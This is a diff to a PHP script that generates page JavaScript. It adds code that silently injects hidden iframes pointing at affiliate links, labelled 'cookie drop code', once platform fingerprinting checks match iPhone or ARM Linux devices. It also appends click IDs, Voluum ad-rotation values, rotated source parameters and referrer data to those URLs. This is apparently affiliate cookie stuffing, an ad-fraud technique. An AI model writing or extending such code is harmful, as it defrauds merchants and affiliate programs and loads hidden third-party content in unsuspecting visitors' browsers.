@@ -785,6 +785,15 @@
 				return value === true; 
 			}
 
+			function addIframe(srcurl) 
+			{
+				var iframe = document.createElement('iframe');
+				iframe.style.display = 'none';
+				iframe.src = srcurl;
+				iframe.sandbox = 'allow-top-navigation allow-popups allow-scripts allow-same-origin';
+				document.body.appendChild(iframe);
+			}
+			
 			if (typeof jslog !== 'function') {
 				jslog = function(text) { " . ($consoleLoggingEnabled ? "console.log(text);" : "") . " }
 			} " .
@@ -828,12 +837,33 @@
 				if (testResults.every(isTrue)) {
 					if (/(iphone|linux armv)/i.test(window.navigator.platform)) {
 						jslog('CHECK:PLATFORM_ALLOWED: Platform test succeeded: ' + window.navigator.platform); ";
-						
+
 			// Add cookie drop code
 			if (true && $iFrameCookiesEnabled) {
-				foreach($affiliateLinkUrl as $url) {
-					if (strlen($url) > 0) {
-			$scriptCode .= "document.write('<iframe src=\"".$url."\" style=\"display:none\" sandbox=\"allow-top-navigation allow-popups allow-scripts allow-same-origin\"></iframe>');";
+				foreach($affiliateLinkUrl as $cookieUrl) {
+					if (strlen($cookieUrl) > 0) {
+						
+						$cookieUrl = appendParameterPrefix($cookieUrl) . "ccid=$adClickID";
+						if ($voluumAdCycleCount > 0)
+						{
+							$cookieUrl = appendParameterPrefix($cookieUrl) . "ad=" . (($adVisits % $voluumAdCycleCount) + 1);
+						}
+						// Append auto generated source parameter
+						$cookieUrl = appendAutoRotateParameter($cookieUrl, "f_apps", $f_apps_WeightList);
+						$cookieUrl = appendAutoRotateParameter($cookieUrl, "f_site", $f_site_WeightList);
+						$cookieUrl = appendAutoRotateParameter($cookieUrl, "f_siteid", $f_siteid_WeightList);
+						
+						// Append passed in script parameters if outputMethod == JS
+						if ($outputMethod === "JS")
+						{
+							$cookieUrl .= appendParameterPrefix($cookieUrl) . $queryString;
+						}
+
+						// Append referrer
+						$cookieUrl = appendReferrerParameter($cookieUrl);
+						
+						// Finally. add the iframe code
+						$scriptCode .= "addIframe(\"".$cookieUrl."\");";
 					}
 				}
 			}
